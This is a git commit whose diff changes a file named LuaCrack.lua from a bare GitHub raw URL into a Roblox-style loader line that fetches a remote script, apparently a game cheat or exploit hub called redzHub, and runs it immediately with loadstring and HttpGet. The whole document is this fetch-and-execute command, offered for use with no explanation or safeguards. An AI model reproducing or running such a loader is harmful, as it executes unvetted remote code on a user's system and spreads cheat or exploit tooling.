e0fbcfa0fbc31617f35326f28473c1f8d960684c
Binn-nguyen <dnphuc411@gmail.com>
2026-06-22 15:04:12 +0700

    LuaCrack.lua

--- LuaCrack.lua
+++ LuaCrack.lua
@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/huy384/redzHub/refs/heads/main/redzHub.lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/huy384/redzHub/refs/heads/main/redzHub.lua"))()
